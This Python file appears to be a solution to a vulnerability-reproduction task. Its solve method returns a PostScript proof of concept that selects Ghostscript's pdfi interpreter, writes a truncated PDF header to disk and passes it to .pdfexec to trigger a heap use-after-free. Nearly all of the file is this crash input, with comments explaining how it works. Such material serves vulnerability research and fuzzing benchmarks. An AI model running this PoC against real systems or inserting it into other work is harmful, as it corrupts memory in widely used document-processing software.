import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in pdfi.
        The vulnerability occurs when pdfi_set_input_stream fails (e.g. due to a malformed PDF)
        but the context is subsequently used or cleaned up incorrectly.
        """
        # The PoC performs the following:
        # 1. Sets the /PDFInterpreter to /pdfi in userparams to enable the vulnerable interpreter.
        # 2. Writes a minimal file to disk that has a PDF header but is truncated/invalid.
        #    This causes the stream setup in pdfi to fail.
        # 3. Opens the file and passes it to .pdfexec, triggering the vulnerability.
        
        poc = (
            b"%!PS\n"
            b"<< /PDFInterpreter /pdfi >> setuserparams\n"
            b"/fname (poc.pdf) def\n"
            b"fname (w) file dup (%PDF-1.4\\n) writestring closefile\n"
            b"fname (r) file .pdfexec\n"
        )
        return poc
